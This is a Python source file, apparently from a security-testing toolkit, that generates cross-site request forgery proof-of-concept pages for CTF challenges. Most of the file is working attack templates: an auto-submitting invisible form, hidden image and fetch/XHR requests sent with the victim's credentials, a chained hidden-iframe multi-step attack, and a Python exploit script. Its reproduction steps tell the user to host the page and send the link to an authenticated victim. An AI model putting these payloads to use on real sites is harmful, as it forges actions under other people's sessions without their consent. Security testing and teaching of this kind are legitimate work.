"""CSRF PoC Generator for CTF challenges."""

from dataclasses import dataclass
from typing import Optional
from urllib.parse import urlencode, urlparse
import json

from .poc_generator import PocGenerator, PocResult, PocType


@dataclass
class CsrfTarget:
    """Target action for CSRF attack."""
    url: str
    method: str
    params: dict
    description: str = ""


class CsrfPocGenerator(PocGenerator):
    """Generate CSRF PoC for CTF challenges."""
    
    # HTML template for CSRF PoC
    HTML_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>CSRF PoC - {title}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; background: #1a1a2e; color: #eee; }}
        .container {{ max-width: 900px; margin: 0 auto; }}
        h1 {{ color: #e94560; }}
        .info {{ background: #16213e; padding: 20px; border-radius: 8px; margin: 20px 0; }}
        .code {{ background: #0f3460; padding: 15px; border-radius: 4px; font-family: monospace; 
                white-space: pre-wrap; word-break: break-all; margin: 10px 0; overflow-x: auto; }}
        .btn {{ background: #e94560; color: white; padding: 12px 24px; border: none; 
               border-radius: 4px; cursor: pointer; font-size: 16px; margin: 5px; }}
        .btn:hover {{ background: #ff6b6b; }}
        .btn-safe {{ background: #4cc9f0; }}
        .btn-safe:hover {{ background: #7dd3fc; }}
        .warning {{ color: #ffd93d; margin: 20px 0; padding: 15px; background: #3d2c00; border-radius: 4px; }}
        a {{ color: #4cc9f0; }}
        .evidence {{ background: #1f4068; padding: 15px; border-radius: 4px; margin: 10px 0; }}
        .hidden {{ display: none; }}
        table {{ width: 100%; border-collapse: collapse; margin: 10px 0; }}
        th, td {{ padding: 10px; text-align: left; border: 1px solid #333; }}
        th {{ background: #0f3460; }}
        .success {{ color: #4ade80; }}
        .tab-container {{ margin: 20px 0; }}
        .tab {{ display: inline-block; padding: 10px 20px; cursor: pointer; background: #0f3460; 
               border-radius: 4px 4px 0 0; margin-right: 5px; }}
        .tab.active {{ background: #1f4068; }}
        .tab-content {{ background: #1f4068; padding: 20px; border-radius: 0 4px 4px 4px; }}
        .tab-panel {{ display: none; }}
        .tab-panel.active {{ display: block; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>CSRF Proof of Concept</h1>
        
        <div class="warning">
            <strong>⚠️ Warning:</strong> This PoC is for authorized security testing only.
            Unauthorized use is illegal. The forms below will make REAL requests when submitted.
        </div>
        
        <div class="info">
            <h3>Target Information</h3>
            <table>
                <tr><th>Target URL</th><td><a href="{target_url}" target="_blank">{target_url}</a></td></tr>
                <tr><th>HTTP Method</th><td>{method}</td></tr>
                <tr><th>Action</th><td>{action_description}</td></tr>
            </table>
        </div>
        
        <div class="info">
            <h3>Request Parameters</h3>
            <table>
                <tr><th>Parameter</th><th>Value</th></tr>
                {params_rows}
            </table>
        </div>
        
        <div class="tab-container">
            <span class="tab active" onclick="showTab('auto')">Auto-Submit Form</span>
            <span class="tab" onclick="showTab('manual')">Manual Form</span>
            <span class="tab" onclick="showTab('img')">Image Tag</span>
            <span class="tab" onclick="showTab('xhr')">XHR/Fetch</span>
        </div>
        
        <div class="tab-content">
            <div id="tab-auto" class="tab-panel active">
                <h4>Auto-Submit Form (Invisible)</h4>
                <p>This form automatically submits when the page loads:</p>
                <div class="code">{auto_form_code}</div>
                <button class="btn" onclick="copyToClipboard('auto-form-code')">Copy Code</button>
                <textarea id="auto-form-code" class="hidden">{auto_form_raw}</textarea>
            </div>
            
            <div id="tab-manual" class="tab-panel">
                <h4>Manual Form (Visible)</h4>
                <p>A visible form that requires user interaction:</p>
                <div class="code">{manual_form_code}</div>
                <button class="btn" onclick="copyToClipboard('manual-form-code')">Copy Code</button>
                <textarea id="manual-form-code" class="hidden">{manual_form_raw}</textarea>
            </div>
            
            <div id="tab-img" class="tab-panel">
                <h4>Image Tag (GET only)</h4>
                <p>Uses an image tag to trigger GET request:</p>
                <div class="code">{img_tag_code}</div>
                <button class="btn" onclick="copyToClipboard('img-tag-code')">Copy Code</button>
                <textarea id="img-tag-code" class="hidden">{img_tag_raw}</textarea>
            </div>
            
            <div id="tab-xhr" class="tab-panel">
                <h4>JavaScript XHR/Fetch</h4>
                <p>Uses JavaScript to send the request:</p>
                <div class="code">{xhr_code}</div>
                <button class="btn" onclick="copyToClipboard('xhr-code')">Copy Code</button>
                <textarea id="xhr-code" class="hidden">{xhr_raw}</textarea>
            </div>
        </div>
        
        <div class="info">
            <h3>Test the PoC</h3>
            <p>Click the button below to test the CSRF attack (will make a real request):</p>
            <button class="btn" onclick="testCsrf()">Execute CSRF Attack</button>
            <button class="btn btn-safe" onclick="testCsrfSafe()">Test Without Submitting</button>
            <div id="result" style="margin-top: 15px;"></div>
        </div>
        
        <div class="info">
            <h3>Evidence</h3>
            <div class="evidence">
                <p><strong>Generated:</strong> {timestamp}</p>
                <p><strong>Steps to Reproduce:</strong></p>
                <ol>
                    {steps_html}
                </ol>
                <p><strong>Expected Result:</strong> {expected_result}</p>
            </div>
        </div>
        
        {hidden_form}
    </div>
    
    <script>
        function showTab(tabName) {{
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
            event.target.classList.add('active');
            document.getElementById('tab-' + tabName).classList.add('active');
        }}
        
        function copyToClipboard(elementId) {{
            var textarea = document.getElementById(elementId);
            textarea.select();
            document.execCommand('copy');
            alert('Copied to clipboard!');
        }}
        
        function testCsrf() {{
            if (confirm('This will make a real request. Continue?')) {{
                document.getElementById('csrf-form').submit();
            }}
        }}
        
        function testCsrfSafe() {{
            var form = document.getElementById('csrf-form');
            var result = document.getElementById('result');
            result.innerHTML = '<p class="success">✓ Form is ready. In a real attack:</p>' +
                '<ul>' +
                '<li>Method: ' + form.method.toUpperCase() + '</li>' +
                '<li>Action: ' + form.action + '</li>' +
                '<li>Parameters: {params_json}</li>' +
                '</ul>';
        }}
    </script>
</body>
</html>
"""

    # Auto-submit form template
    AUTO_FORM_TEMPLATE = """<html>
<body>
<form id="csrf" action="{action}" method="{method}">
{inputs}
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>"""

    # Manual form template
    MANUAL_FORM_TEMPLATE = """<form action="{action}" method="{method}">
{inputs}
    <input type="submit" value="{button_text}">
</form>"""

    # Image tag template (GET only)
    IMG_TAG_TEMPLATE = """<img src="{url}" style="display:none">"""
    
    # XHR template
    XHR_TEMPLATE = """<script>
var xhr = new XMLHttpRequest();
xhr.open('{method}', '{action}', true);
{headers}
xhr.withCredentials = true;
xhr.send({body});
</script>"""
    
    # Fetch template
    FETCH_TEMPLATE = """<script>
fetch('{action}', {{
    method: '{method}',
    credentials: 'include',
    {headers}
    body: {body}
}});
</script>"""
    
    def generate(
        self,
        action_url: Optional[str] = None,
        params: Optional[dict] = None,
        action_description: str = "Perform action",
        button_text: str = "Click Me!",
        content_type: str = "application/x-www-form-urlencoded",
        output_dir: str = ".",
        save_html: bool = True,
        use_fetch: bool = False,
    ) -> PocResult:
        """
        Generate CSRF PoC.
        
        Args:
            action_url: Target URL for the CSRF action (default: self.target_url)
            params: Parameters to include in the request
            action_description: Description of the malicious action
            button_text: Text for the submit button
            content_type: Content-Type for the request
            output_dir: Directory to save HTML file
            save_html: Whether to save standalone HTML file
            use_fetch: Use fetch API instead of XHR
        
        Returns:
            PocResult with generated PoC
        """
        action = action_url or self.target_url
        request_params = params or self.data or {}
        
        # Generate form inputs
        inputs_html = self._generate_inputs(request_params)
        
        # Generate auto-submit form
        auto_form = self.AUTO_FORM_TEMPLATE.format(
            action=action,
            method=self.method,
            inputs=inputs_html,
        )
        
        # Generate manual form
        manual_form = self.MANUAL_FORM_TEMPLATE.format(
            action=action,
            method=self.method,
            inputs=inputs_html,
            button_text=button_text,
        )
        
        # Generate image tag (GET only)
        if self.method == "GET":
            img_url = f"{action}?{urlencode(request_params)}" if request_params else action
            img_tag = self.IMG_TAG_TEMPLATE.format(url=img_url)
        else:
            img_tag = "<!-- Image tag only works with GET requests -->"
        
        # Generate XHR/Fetch code
        if use_fetch:
            xhr_code = self._generate_fetch(action, request_params, content_type)
        else:
            xhr_code = self._generate_xhr(action, request_params, content_type)
        
        # Generate curl command
        curl_cmd = self.generate_curl_command(
            action,
            method=self.method,
            data=request_params,
            headers={"Content-Type": content_type} if self.method == "POST" else None,
        )
        
        # Generate Python script
        python_script = self._generate_python_script(action, request_params, content_type)
        
        # Steps to reproduce
        steps = [
            "Host the CSRF PoC HTML on your controlled server",
            f"Send the link to the victim who is authenticated to {urlparse(action).netloc}",
            "When victim opens the link, the form auto-submits",
            f"The action '{action_description}' is performed on victim's behalf",
        ]
        
        # Expected result
        expected = f"The '{action_description}' action is performed using the victim's session/cookies"
        
        # Create result
        result = PocResult(
            poc_type=PocType.CSRF,
            target_url=action,
            payload=auto_form,
            curl_command=curl_cmd,
            python_script=python_script,
            evidence_description=f"CSRF attack performs: {action_description}",
            steps_to_reproduce=steps,
            expected_result=expected,
        )
        
        # Save HTML file
        if save_html:
            html_content = self._generate_html(
                action=action,
                params=request_params,
                action_description=action_description,
                auto_form=auto_form,
                manual_form=manual_form,
                img_tag=img_tag,
                xhr_code=xhr_code,
                steps=steps,
                expected=expected,
            )
            filename = "csrf_poc.html"
            result.html_file = self.save_html(html_content, filename, output_dir)
        
        return result
    
    def generate_multi_step(
        self,
        steps: list[CsrfTarget],
        output_dir: str = ".",
    ) -> PocResult:
        """
        Generate multi-step CSRF PoC.
        
        Args:
            steps: List of CsrfTarget actions to perform in sequence
        
        Returns:
            PocResult with generated PoC
        """
        # Generate iframe-based multi-step CSRF
        iframes_html = []
        for i, step in enumerate(steps):
            form_id = f"csrf-{i}"
            inputs = self._generate_inputs(step.params)
            form = f"""
<iframe name="frame-{i}" style="display:none"></iframe>
<form id="{form_id}" action="{step.url}" method="{step.method}" target="frame-{i}">
{inputs}
</form>
"""
            iframes_html.append(form)
        
        # JavaScript to submit forms in sequence
        submit_script = """<script>
var delay = 1000;
var forms = [""" + ", ".join(f"'{i}'" for i in range(len(steps))) + """];
forms.forEach(function(formId, index) {
    setTimeout(function() {
        document.getElementById('csrf-' + formId).submit();
    }, delay * index);
});
</script>"""
        
        payload = "\n".join(iframes_html) + submit_script
        
        html_content = f"""<!DOCTYPE html>
<html>
<head><title>Multi-Step CSRF PoC</title></head>
<body>
<h1>Multi-Step CSRF Attack</h1>
<p>Executing {len(steps)} steps...</p>
{payload}
</body>
</html>"""
        
        # Steps to reproduce
        reproduce_steps = [
            "Host the PoC HTML on your controlled server",
            "Send the link to an authenticated victim",
        ]
        for i, step in enumerate(steps):
            reproduce_steps.append(f"Step {i+1}: {step.description or step.url}")
        
        result = PocResult(
            poc_type=PocType.CSRF,
            target_url=steps[0].url if steps else "",
            payload=payload,
            evidence_description=f"Multi-step CSRF attack with {len(steps)} actions",
            steps_to_reproduce=reproduce_steps,
            expected_result="All CSRF actions are performed in sequence",
        )
        
        filename = "csrf_multi_step_poc.html"
        result.html_file = self.save_html(html_content, filename, output_dir)
        
        return result
    
    def _generate_inputs(self, params: dict) -> str:
        """Generate hidden input fields."""
        inputs = []
        for name, value in params.items():
            escaped_name = self.escape_html(str(name))
            escaped_value = self.escape_html(str(value))
            inputs.append(f'    <input type="hidden" name="{escaped_name}" value="{escaped_value}">')
        return "\n".join(inputs)
    
    def _generate_xhr(self, action: str, params: dict, content_type: str) -> str:
        """Generate XHR code."""
        if content_type == "application/json":
            body = f"JSON.stringify({json.dumps(params)})"
            headers = 'xhr.setRequestHeader("Content-Type", "application/json");'
        else:
            body = f'"{urlencode(params)}"'
            headers = 'xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");'
        
        return self.XHR_TEMPLATE.format(
            method=self.method,
            action=action,
            headers=headers,
            body=body,
        )
    
    def _generate_fetch(self, action: str, params: dict, content_type: str) -> str:
        """Generate Fetch API code."""
        if content_type == "application/json":
            body = f"JSON.stringify({json.dumps(params)})"
            headers = f'headers: {{"Content-Type": "application/json"}},'
        else:
            if self.method == "GET":
                body = "null"
                headers = ""
            else:
                body = f'new URLSearchParams({json.dumps(params)})'
                headers = ""
        
        return self.FETCH_TEMPLATE.format(
            method=self.method,
            action=action,
            headers=headers,
            body=body,
        )
    
    def _generate_html(
        self,
        action: str,
        params: dict,
        action_description: str,
        auto_form: str,
        manual_form: str,
        img_tag: str,
        xhr_code: str,
        steps: list[str],
        expected: str,
    ) -> str:
        """Generate standalone HTML PoC page."""
        from datetime import datetime
        
        # Generate params table rows
        params_rows = "\n".join(
            f"<tr><td>{self.escape_html(str(k))}</td><td>{self.escape_html(str(v))}</td></tr>"
            for k, v in params.items()
        ) or "<tr><td colspan='2'>No parameters</td></tr>"
        
        steps_html = "\n".join(f"<li>{step}</li>" for step in steps)
        
        # Hidden form for testing
        inputs = self._generate_inputs(params)
        hidden_form = f"""
<form id="csrf-form" action="{action}" method="{self.method}" style="display:none;">
{inputs}
</form>
"""
        
        return self.HTML_TEMPLATE.format(
            title="CSRF Attack",
            target_url=self.escape_html(action),
            method=self.method,
            action_description=action_description,
            params_rows=params_rows,
            auto_form_code=self.escape_html(auto_form),
            auto_form_raw=self.escape_html(auto_form),
            manual_form_code=self.escape_html(manual_form),
            manual_form_raw=self.escape_html(manual_form),
            img_tag_code=self.escape_html(img_tag),
            img_tag_raw=self.escape_html(img_tag),
            xhr_code=self.escape_html(xhr_code),
            xhr_raw=self.escape_html(xhr_code),
            timestamp=datetime.now().isoformat(),
            steps_html=steps_html,
            expected_result=expected,
            hidden_form=hidden_form,
            params_json=json.dumps(params),
        )
    
    def _generate_python_script(self, action: str, params: dict, content_type: str) -> str:
        """Generate Python exploit script."""
        return f'''#!/usr/bin/env python3
"""
CSRF PoC Script
Target: {action}
"""

import requests

TARGET_URL = "{action}"
METHOD = "{self.method}"
PARAMS = {json.dumps(params, indent=4)}

def exploit(session_cookie: str = None):
    """Execute CSRF exploit with victim's session."""
    
    cookies = {{"session": session_cookie}} if session_cookie else {{}}
    headers = {{"Content-Type": "{content_type}"}}
    
    print(f"[*] Target: {{TARGET_URL}}")
    print(f"[*] Method: {{METHOD}}")
    print(f"[*] Params: {{PARAMS}}")
    print()
    
    try:
        if METHOD == "GET":
            response = requests.get(TARGET_URL, params=PARAMS, cookies=cookies, timeout=10)
        else:
            if "{content_type}" == "application/json":
                import json
                response = requests.post(TARGET_URL, json=PARAMS, headers=headers, cookies=cookies, timeout=10)
            else:
                response = requests.post(TARGET_URL, data=PARAMS, cookies=cookies, timeout=10)
        
        print(f"[+] Response Status: {{response.status_code}}")
        print(f"[+] Response Length: {{len(response.text)}}")
        
        if response.status_code < 400:
            print("[+] SUCCESS: Request completed!")
            return True
        else:
            print("[-] Request may have failed")
            return False
            
    except Exception as e:
        print(f"[-] Error: {{e}}")
        return False

if __name__ == "__main__":
    print("=" * 60)
    print("CSRF Proof of Concept")
    print("=" * 60)
    print()
    print("Usage: Provide victim's session cookie to simulate attack")
    print()
    
    # Without cookie (for testing)
    exploit()
'''
